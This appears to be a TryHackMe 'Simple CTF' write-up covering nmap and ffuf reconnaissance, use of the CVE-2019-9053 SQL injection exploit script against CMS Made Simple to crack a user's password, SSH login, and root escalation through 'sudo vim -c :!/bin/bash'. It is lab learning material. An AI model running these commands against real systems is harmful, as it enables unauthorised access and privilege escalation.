---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Simple CTF
# DESCRIPTION       . Beginner level ctf
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/easyctf
```

```bash
sudo nmap -sSVC -T5 10.10.215.71 -p- -oN simplectf
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.53.46
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

- from the nmap scan, we already see 3 interesting things:

- ssh was moved from the default port `22` to `2222`, in an attempt to hide it from public eye.

- `FTP` is allowing anonymous login 
- `robots.txt` has 2 disallowed entries.

```robots.txt
Disallow: /openemr-5_0_1_3
```

- This made me think that maybe OpenEMR is installed on the webserver, and by looking around I found that version 5.0.1.3 is vulnerable. 

- However, I wanted to see if there's something else hidden around so I've done some fuzzing

```bash
ffuf -u http://10.10.215.71/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 100 -e .php
```

```bash
simple                  [Status: 301, Size: 313, Words: 20, Lines: 10]
```

- This revealed a new page - running CMS Made Simple v2.2.8

- After some googling, I've found on Exploit-DB that all CMS Made Simple versions <= 2.2.10 are vulnerable to unauthenticated SQL injection - [CVE-2019-9053](https://nvd.nist.gov/vuln/detail/CVE-2019-9053)

- I've downloaded the python script and made it work with python3 ... jokes on me :) 

```bash
python3 46635.py -u http://10.10.215.71/simple/ --crack -w /usr/share/wordlists/SecLists/Passwords/darkweb2017-top1000.txt
```

- After running for a while, the script decided that it can't crack the password.

```
if hashlib.md5(str(salt) + line).hexdigest() == password:

TypeError: Strings must be encoded before hashing
```

So I've changed the line to 

```python
hashlib.md5((salt + line).encode()).hexdigest()
```

and gave it another try.

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: {redacted}
```

- Okay, it seems we got some credentials: mitch:{redacted}

- I tried connecting to `FTP` first, but we can't.

```bash
530 This FTP server is anonymous only.
```

**NOTE**: Connecting with `anonymous:anonymous` doesn't reveal anything.

- It seems that the credentials are working for `SSH`.

```bash
ssh mitch@10.10.215.71 -p 2222

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ whoami
mitch
```

- First flag is located at `/home/mitch/user.txt`

- After finding the flag, I've started checking for privilege escalation vectors.

- A simple `sudo -l` reveals that we can use `vim` as `sudo`. This is very powerful, as we can spawn a `shell` under `root`.

```bash
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

```bash
sudo vim -c ':!/bin/bash'
```

- The last flag is at `/root/root.txt`.



